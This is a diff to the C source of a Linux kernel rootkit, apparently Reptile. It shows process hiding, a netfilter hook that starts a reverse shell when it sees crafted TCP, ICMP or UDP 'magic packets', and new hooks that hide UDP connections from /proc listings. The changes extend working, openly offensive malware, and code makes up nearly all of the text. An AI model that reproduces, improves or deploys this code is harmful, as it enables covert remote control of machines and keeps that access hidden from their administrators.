@@ -90,6 +90,7 @@ struct hidden_conn {
 };
 
 LIST_HEAD(hidden_tcp_conn);
+LIST_HEAD(hidden_udp_conn);
 
 void hide(void)
 {
@@ -179,20 +180,23 @@ int is_invisible(pid_t pid)
 
 	if (!pid)
 		return ret;
+
 	task = find_task(pid);
 	if (!task)
 		return ret;
+
 	if (task->flags & FLAG)
 		ret = 1;
+
 	put_task_struct(task);
 	return ret;
 }
 
-void exec(char **argv)
+int exec(char **argv)
 {
 	char *path = PATH;
 	char *envp[] = {path, NULL};
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 void shell_execer(struct work_struct *work)
@@ -350,8 +354,7 @@ char **parse(char *line)
 		if (position >= bufsize) {
 			bufsize += TOK_BUFSIZE;
 			tokens_backup = tokens;
-			tokens = krealloc(tokens, bufsize * sizeof(char *),
-					  GFP_KERNEL);
+			tokens = krealloc(tokens, bufsize * sizeof(char *), GFP_KERNEL);
 			if (!tokens) {
 				kfree(tokens_backup);
 				return NULL;
@@ -386,10 +389,10 @@ void _sub(char *arg, int key, int nbytes)
 }
 
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
-			       struct sk_buff *socket_buffer,
-			       const struct net_device *in,
-			       const struct net_device *out,
-			       int (*okfn)(struct sk_buff *))
+			    			   struct sk_buff *socket_buffer,
+			    			   const struct net_device *in,
+							   const struct net_device *out,
+							   int (*okfn)(struct sk_buff *))
 {
 	const struct iphdr *ip_header;
 	const struct icmphdr *icmp_header;
@@ -434,8 +437,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 
 		if (//htons(tcp_header->seq) == SEQ &&   /* uncoment this if you wanna use tcp_header->seq as filter */
 		    htons(tcp_header->window) == WIN) {
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_tcph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_tcph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -450,9 +452,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct tcphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct tcphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -471,8 +472,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -500,8 +500,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(icmp_header->un.echo.sequence) == SEQ &&
 		    htons(icmp_header->un.echo.id) == WIN) {
 
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_icmph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -516,9 +515,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct icmphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct icmphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -537,9 +535,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
-
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -567,8 +563,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(udp_header->len) <=
 		    (sizeof(struct udphdr) + strlen(TOKEN) + 25)) {
 
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_udph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_udph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -583,9 +578,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct udphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct udphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -604,9 +598,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
-
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -846,6 +838,34 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 				}
 			}
 			break;
+		case 6:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
+
+			if (!hc)
+				goto out;
+
+			hc->addr = addr;
+
+			list_add(&hc->list, &hidden_udp_conn);
+			break;
+		case 7:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+			list_for_each_entry(hc, &hidden_udp_conn, list)
+			{
+				if (addr.sin_port == hc->addr.sin_port &&
+				    addr.sin_addr.s_addr ==
+					hc->addr.sin_addr.s_addr) {
+					list_del(&hc->list);
+					kfree(hc);
+					break;
+				}
+			}
+			break;
 		default:
 			goto origin;
 		}
@@ -898,6 +918,47 @@ origin:
 	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
 out:
 	KHOOK_PUT(tcp4_seq_show);
+	return ret;
+}
+
+KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
+static int khook_udp4_seq_show(struct seq_file *seq, void *v)
+{
+	int ret;
+	struct sock *sk = v;
+	struct inet_sock *inet;
+	struct hidden_conn *hc;
+	unsigned short dport;
+	unsigned int daddr;
+
+	KHOOK_GET(udp4_seq_show);
+
+	if (v == SEQ_START_TOKEN) {
+		goto origin;
+	}
+
+	inet = (struct inet_sock *)sk;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
+	dport = inet->inet_dport;
+	daddr = inet->inet_daddr;
+#else
+	dport = inet->dport;
+	daddr = inet->daddr;
+#endif
+
+	list_for_each_entry(hc, &hidden_udp_conn, list)
+	{
+		if ( //hc->addr.sin_port == dport &&
+		    hc->addr.sin_addr.s_addr == daddr) {
+			ret = 0;
+			goto out;
+		}
+	}
+origin:
+	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
+out:
+	KHOOK_PUT(udp4_seq_show);
 	return ret;
 }
 
@@ -978,6 +1039,11 @@ static int __init reptile_init(void)
 
 	work_queue = create_workqueue(WORKQUEUE);
 
+	ret = khook_init();
+
+	if (ret != 0)
+		goto out;
+
 	magic_packet_hook_options.hook = (void *)magic_packet_hook;
 	magic_packet_hook_options.hooknum = 0;
 	magic_packet_hook_options.pf = PF_INET;
@@ -988,10 +1054,11 @@ static int __init reptile_init(void)
 #else
 	nf_register_hook(&magic_packet_hook_options);
 #endif
-	ret = khook_init();
+	
 	exec(argv);
 	hide();
 
+out:
 	return ret;
 }
 
